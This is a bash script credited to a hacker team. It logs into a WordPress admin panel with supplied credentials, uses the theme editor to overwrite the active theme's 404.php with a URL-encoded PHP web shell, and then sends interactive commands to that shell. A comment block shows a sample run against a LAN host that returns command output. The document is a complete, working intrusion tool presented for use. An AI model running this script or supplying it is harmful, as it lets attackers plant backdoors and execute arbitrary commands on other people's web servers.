#!/usr/bin/env bash
# Wordpress Auto Login And Shell Upload
# By Versailles / viloid
# Sec7or Team | Surabaya Hacker Link

# root@cans:~/wp# ./wp "http://192.168.100.8/wp" "admin" "cans21"
# [?] Target : http://192.168.100.8/wp
# [?] Username : admin
# [?] Password : cans21

# [!] Success Logged In!
# [!] Theme Active : twentynineteen
# [!] Try To Uploading WebShell......
# [+] Shell Uploaded >> http://192.168.100.8/wp/wp-content/themes/twentynineteen/404.php
# [+] PHP Uname : Windows NT DESKTOP-OGAB21Q 10.0 build 17134 (Windows 10) i586
# [?] Test Command Shell : hostname 
# [=] DESKTOP-OGAB21Q

host=$1
uname=$2
pass=$3
shell="%3C%3Fphp+if%28isset%28%24_REQUEST%5B0%5D%29%29%7Becho+%60%24_REQUEST%5B0%5D%60%3B%7Delse%7Becho+php_uname%28%29%3B%7D"

echo "[?] Target : $1"
echo "[?] Username : $2"
echo "[?] Password : $3"
echo ""

login=$(curl -s --cookie wp.cookie --cookie-jar wp.cookie -d "log=$uname&pwd=$pass&wp-submit=Log+In&redirect_to=./wp-admin/&testcookie=1" ${host}/wp-login.php)

if [[ -z $login ]]; then
	echo "[!] Success Logged In!"
	checktheme=$(curl -s --cookie wp.cookie --cookie-jar wp.cookie ${host}/wp-admin/themes.php)
	theme=$(echo $checktheme | grep -oP '(?<=theme=).*(?=&#038;return=%2Fwp%2Fwp-admin%2Fthemes.php">Customize)')
	echo "[!] Theme Active : $theme"
	
	chk404=$(curl -s --cookie wp.cookie --cookie-jar wp.cookie ${host}/wp-admin/theme-editor.php?file=404.php&theme=${theme})
	nonce=$(echo $chk404 | grep -oP '(?<="nonce" value=").*(?=")' | cut -d '"' -f1)

	echo "[!] Try To Uploading WebShell......"
	upload=$(curl -s --cookie wp.cookie --cookie-jar wp.cookie -d "nonce=${nonce}&_wp_http_referer=%2Fwp%2Fwp-admin%2Ftheme-editor.php%3Ffile%3D404.php%26theme%3D${theme}&newcontent=${shell}&action=edit-theme-plugin-file&file=404.php&theme=${theme}&docs-list=" ${host}/wp-admin/theme-editor.php)
	shell_loc="${host}/wp-content/themes/${theme}/404.php"
	checkshell=$(curl -s "$shell_loc")
	if [[ $checkshell =~ "Fatal error" ]]; then
		echo "[-] Failed Upload Shell"
	else
		echo "[+] Shell Uploaded >> $shell_loc"
		echo "[+] PHP Uname : `curl -s $shell_loc`"
		read -p "[?] Test Command Shell : " cmd		
		testshell=$(curl -s $shell_loc -d "0=$cmd")
		echo "[=] $testshell"
	fi
	
else
	echo "[!] Failed Log-In!"
fi

